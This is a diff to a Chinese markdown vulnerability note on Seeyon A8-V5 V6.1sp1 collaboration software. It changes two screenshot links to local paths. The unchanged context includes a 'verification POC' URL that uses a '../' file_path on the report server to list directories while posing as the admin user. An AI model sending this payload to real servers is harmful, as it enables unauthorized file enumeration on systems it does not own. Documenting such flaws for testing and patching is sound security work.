@@ -20,7 +20,7 @@ title="致远A8-V5协同管理软件 V6.1sp1"
 
 登录页面
 
-![image-20220824142626725](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241426793.png)
+![image-20220824142626725](./images/202208241426793.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ title="致远A8-V5协同管理软件 V6.1sp1"
 /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
 ```
 
-![image-20220824142642510](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241426552.png)
+![image-20220824142642510](./images/202208241426552.png)
